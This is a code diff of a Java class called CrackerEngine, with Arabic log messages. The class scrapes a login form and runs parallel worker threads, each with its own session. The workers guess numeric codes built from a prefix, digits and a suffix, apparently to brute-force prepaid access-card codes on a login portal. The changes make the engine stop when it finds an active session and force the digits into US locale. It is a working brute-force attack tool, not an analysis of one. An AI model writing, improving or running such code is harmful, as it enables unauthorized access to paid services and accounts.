@@ -66,16 +66,14 @@ public class CrackerEngine {
             log("▶ بدء المحرك (جلسات مستقلة لكل عامل)");
             log("  URLs: " + loginUrl);
 
-            // 1. Extract form (shared - just to know field names)
             log("→ استخراج حقول الفورم...");
             formTemplate = extractForm();
             if (formTemplate == null) { log("❌ فشل استخراج الفورم"); return; }
             log("✓ الحقول: " + formTemplate.keySet());
 
-            // 2. Check current session
+            log("→ فحص الجلسة الحالية...");
             if (checkInitSession()) return;
 
-            // 3. Spawn workers, each with own session
             List<Thread> workers = new ArrayList<>();
             for (int i = 0; i < threads; i++) {
                 final int wid = i;
@@ -93,7 +91,7 @@ public class CrackerEngine {
         } catch (Exception e) { log("❌ خطأ عام: " + e.getMessage()); }
     }
 
-    private void checkInitSession() {
+    private boolean checkInitSession() {
         try {
             HttpURLConnection c = (HttpURLConnection) new URL(statusUrl).openConnection();
             c.setConnectTimeout(5000); c.setReadTimeout(5000);
@@ -103,10 +101,16 @@ public class CrackerEngine {
             if (o.optString("logged_in").equalsIgnoreCase("yes")) {
                 String u = o.optString("username", "");
                 if (!u.isEmpty() && !u.equals("-") && !u.equals("N/A")) {
-                    log("ℹ كرت مسجل موجود: " + u + " (لن يمنع التخمين)");
+                    log("ℹ كرت مسجل موجود: " + u);
+                    log("🛑 إيقاف التخمين (يوجد جلسة نشطة).");
+                    found.set(true);
+                    stopped.set(true);
+                    listener.onFound(u, body);
+                    return true;
                 }
             }
         } catch (Exception e) {}
+        return false;
     }
 
     private Map<String, String> extractForm() {
@@ -135,7 +139,6 @@ public class CrackerEngine {
         Map<String, String> cookies = new HashMap<>();
         int sinceRest = 0;
 
-        // Init this worker's own session
         if (!initSession(cookies)) { log("[W" + id + "] فشل بدء الجلسة"); return; }
         log("[W" + id + "] ✓ جلسة مستقلة (" + cookies.size() + " كوكي)");
 
@@ -259,6 +262,7 @@ public class CrackerEngine {
         int max = (int) Math.pow(10, digits) - 1;
         for (int k = 0; k < 500; k++) {
             int num = rng.nextInt(max + 1);
+            // إجبار الأرقام على اللغة الإنجليزية (Locale.US)
             String v = prefix + String.format(java.util.Locale.US, "%0" + digits + "d", num) + suffix;
             if (tried.add(v)) {
                 synchronized (prefs) {
